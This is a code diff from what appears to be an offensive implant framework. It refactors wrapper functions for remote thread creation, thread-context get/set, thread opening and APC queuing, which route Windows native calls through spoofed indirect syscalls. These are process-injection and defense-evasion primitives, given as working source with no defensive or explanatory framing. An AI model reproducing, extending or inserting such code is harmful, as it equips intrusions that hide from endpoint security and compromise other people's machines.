@@ -60,32 +60,23 @@ auto DECLFN Thread::Create(
     HANDLE   Handle = nullptr;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         if ( ProcessHandle ) {
             return Self->Krnl32.CreateRemoteThread(
-                ProcessHandle, 0, StackSize, 
-                (LPTHREAD_START_ROUTINE)StartAddress, 
-                Parameter, uFlags, ThreadID
+                ProcessHandle, 0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, uFlags, ThreadID
             );
         }
+
         return Self->Krnl32.CreateThread(
-            0, StackSize, 
-            (LPTHREAD_START_ROUTINE)StartAddress, 
-            Parameter, uFlags, ThreadID
+            0, StackSize, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, uFlags, ThreadID
         );
     }
 
-    UPTR Address = (Flags == SYSCALL_SPOOF_INDIRECT) 
-        ? (UPTR)Self->Sys->Ext[Sys::CrThread].Instruction 
-        : (UPTR)Self->Ntdll.NtCreateThreadEx;
-
-    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT) 
-        ? (UPTR)Self->Sys->Ext[Sys::CrThread].ssn 
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::CrThread );
+    UPTR ssn     = SYS_SSN( Sys::CrThread );
 
     ULONG CreateFlags = 0;
     if ( uFlags & CREATE_SUSPENDED) CreateFlags |= 0x00000001; 
-
     
     Status = (NTSTATUS)Self->Spf->Call(
         Address, ssn, (UPTR)&Handle, (UPTR)THREAD_ALL_ACCESS,
@@ -111,17 +102,10 @@ auto DECLFN Thread::SetCtx(
     const UINT32 Flags  = Self->Config.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
-        return NT_SUCCESS( Self->Ntdll.NtSetContextThread( Handle, Ctx ) );
-    }
+    if ( ! Flags ) return NT_SUCCESS( Self->Ntdll.NtSetContextThread( Handle, Ctx ) );
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT ) 
-        ? (UPTR)Self->Sys->Ext[Sys::SetCtxThrd].Instruction 
-        : (UPTR)Self->Ntdll.NtSetContextThread;
-    
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT ) 
-        ? (UPTR)Self->Sys->Ext[Sys::SetCtxThrd].ssn 
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::SetCtxThrd );
+    UPTR ssn = SYS_SSN( Sys::SetCtxThrd );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)Ctx
@@ -139,18 +123,10 @@ auto DECLFN Thread::GetCtx(
     const UINT32 Flags  = Self->Config.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
-        return NT_SUCCESS( Self->Ntdll.NtGetContextThread( Handle, Ctx ) );
-    }
+    if ( ! Flags ) return NT_SUCCESS( Self->Ntdll.NtGetContextThread( Handle, Ctx ) );
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::GetCtxThrd].Instruction
-        : (UPTR)Self->Ntdll.NtGetContextThread;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::GetCtxThrd].ssn
-        : 0;
-
+    UPTR Address = SYS_ADDR( Sys::GetCtxThrd );
+    UPTR ssn     = SYS_SSN( Sys::GetCtxThrd );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)Ctx
@@ -177,13 +153,8 @@ auto DECLFN Thread::Open(
         return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT ) 
-        ? (UPTR)Self->Sys->Ext[Sys::OpenThrd].Instruction 
-        : (UPTR)Self->Krnl32.OpenThread;
-    
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT ) 
-        ? (UPTR)Self->Sys->Ext[Sys::OpenThrd].ssn 
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::OpenThrd );
+    UPTR ssn = SYS_SSN( Sys::OpenThrd );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)&Result, RightAccess, (UPTR)&ObjAttr, (UPTR)&ClientId
@@ -204,20 +175,15 @@ auto DECLFN Thread::QueueAPC(
     const UINT32 Flags  = Self->Config.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         return Self->Ntdll.NtQueueApcThread(
             ThreadHandle, (PPS_APC_ROUTINE)CallbackFnc,
             Argument1, Argument2, Argument3
         );
     }
 
-    UPTR Address = (Flags == SYSCALL_SPOOF_INDIRECT)
-        ? (UPTR)Self->Sys->Ext[Sys::QueueApc].Instruction
-        : (UPTR)Self->Ntdll.NtQueueApcThread;
-
-    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
-        ? (UPTR)Self->Sys->Ext[Sys::QueueApc].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::QueueApc );
+    UPTR ssn = SYS_SSN( Sys::QueueApc );
 
     Status = (NTSTATUS)Self->Spf->Call(
         Address, ssn, (UPTR)ThreadHandle,
